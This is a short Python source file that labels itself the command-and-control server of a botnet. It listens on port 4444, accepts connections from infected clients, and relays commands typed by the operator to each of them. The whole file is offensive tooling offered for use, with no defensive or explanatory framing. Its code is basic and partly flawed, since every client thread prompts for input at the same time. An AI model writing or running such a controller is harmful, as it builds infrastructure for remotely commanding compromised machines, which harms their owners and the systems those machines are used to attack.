# server.py - Command and control server for the botnet

import socket
import threading

# Configuration for the server
SERVER_IP = '0.0.0.0'  # Listen on all available interfaces
SERVER_PORT = 4444     # Port for communication

clients = []

def start_server():
    """Start the command and control server."""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((SERVER_IP, SERVER_PORT))
    server.listen(5)
    print(f"Server listening on {SERVER_IP}:{SERVER_PORT}")

    while True:
        client_socket, addr = server.accept()
        print(f"Connection from {addr} has been established!")
        clients.append(client_socket)
        threading.Thread(target=handle_client, args=(client_socket,)).start()

def handle_client(client_socket):
    """Handle communication with a connected client."""
    while True:
        try:
            command = input("Enter command: ")
            client_socket.sendall(command.encode('utf-8'))
            if command.lower() == 'exit':
                break
        except Exception as e:
            print(f"Error handling client: {e}")
            break
    client_socket.close()

if __name__ == "__main__":
    start_server()